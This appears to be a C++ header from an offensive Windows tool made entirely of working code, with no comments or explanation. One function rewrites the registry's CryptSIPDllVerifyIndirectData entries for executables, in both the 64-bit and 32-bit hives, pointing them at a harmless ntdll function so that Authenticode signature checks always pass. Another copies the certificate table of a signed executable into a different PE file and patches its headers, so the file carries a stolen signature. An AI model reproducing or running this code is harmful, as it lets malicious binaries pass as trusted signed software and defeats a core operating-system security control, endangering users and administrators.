#pragma once

#include <Windows.h>
#include <cstdint>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

struct CERT_HEADER {
    uint32_t len;
    uint16_t rev;
    uint16_t type;
};

bool set_reg_values(HKEY root, LPCWSTR path, LPCWSTR dll, LPCWSTR func, REGSAM flag) {
    HKEY key;
    LONG ret = RegOpenKeyExW(root, path, 0, KEY_SET_VALUE | flag, &key);
    if (ret != ERROR_SUCCESS) {
        std::wcerr << L"RegOpenKeyExW failed: " << path << L" (" << ret << L")" << std::endl;
        return false;
    }

    ret = RegSetValueExW(key, L"Dll", 0, REG_SZ, reinterpret_cast<const BYTE*>(dll), (DWORD)((wcslen(dll) + 1) * sizeof(wchar_t)));
    if (ret != ERROR_SUCCESS) {
        std::wcerr << L"RegSetValueExW(Dll) failed: " << ret << std::endl;
        RegCloseKey(key);
        return false;
    }

    ret = RegSetValueExW(key, L"FuncName", 0, REG_SZ, reinterpret_cast<const BYTE*>(func), (DWORD)((wcslen(func) + 1) * sizeof(wchar_t)));
    if (ret != ERROR_SUCCESS) {
        std::wcerr << L"RegSetValueExW(FuncName) failed: " << ret << std::endl;
        RegCloseKey(key);
        return false;
    }

    RegCloseKey(key);
    return true;
}

bool init_hooks() {
    LPCWSTR dll = L"C:\\Windows\\System32\\ntdll.dll";
    LPCWSTR func = L"DbgUiContinue";

    LPCWSTR key64 = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";
    LPCWSTR key32 = L"SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";

    if (!set_reg_values(HKEY_LOCAL_MACHINE, key64, dll, func, KEY_WOW64_64KEY))
        return false;

    if (!set_reg_values(HKEY_LOCAL_MACHINE, key32, dll, func, KEY_WOW64_32KEY))
        return false;

    return true;
}

static inline uint64_t align_8(uint64_t val) {
    return (val + 7) & ~7ULL;
}

bool copy_cert(const std::string& src, const std::string& dst) {
    std::ifstream in(src, std::ios::binary);
    if (!in) return false;

    IMAGE_DOS_HEADER dos_hdr;
    in.read(reinterpret_cast<char*>(&dos_hdr), sizeof(dos_hdr));
    if (dos_hdr.e_magic != 0x5A4D) return false;

    in.seekg(dos_hdr.e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS64 nt_hdr;
    in.read(reinterpret_cast<char*>(&nt_hdr), sizeof(nt_hdr));
    if (nt_hdr.Signature != 0x00004550) return false;

    auto cert_dir = nt_hdr.OptionalHeader.DataDirectory[4];
    if (cert_dir.VirtualAddress == 0 || cert_dir.Size == 0) {
        return false;
    }

    std::vector<char> buffer(cert_dir.Size);
    in.seekg(cert_dir.VirtualAddress, std::ios::beg);
    in.read(buffer.data(), buffer.size());
    in.close();

    std::fstream out(dst, std::ios::binary | std::ios::in | std::ios::out);
    if (!out) return false;

    out.seekg(0, std::ios::end);
    uint64_t pos = out.tellg();
    uint64_t offset = align_8(pos);

    if (offset > pos) {
        std::vector<char> padding(offset - pos, 0);
        out.write(padding.data(), (std::streamsize)padding.size());
    }

    out.write(buffer.data(), (std::streamsize)buffer.size());

    IMAGE_DOS_HEADER dos2;
    out.seekg(0, std::ios::beg);
    out.read(reinterpret_cast<char*>(&dos2), sizeof(dos2));

    uint32_t data_dir_base = dos2.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);
    uint32_t cert_entry = data_dir_base + 4 * sizeof(IMAGE_DATA_DIRECTORY);

    out.seekp(cert_entry + offsetof(IMAGE_DATA_DIRECTORY, VirtualAddress), std::ios::beg);
    uint32_t write_off = static_cast<uint32_t>(offset);
    out.write(reinterpret_cast<const char*>(&write_off), sizeof(write_off));

    uint32_t write_size = cert_dir.Size;
    out.write(reinterpret_cast<const char*>(&write_size), sizeof(write_size));

    out.close();
    return true;
}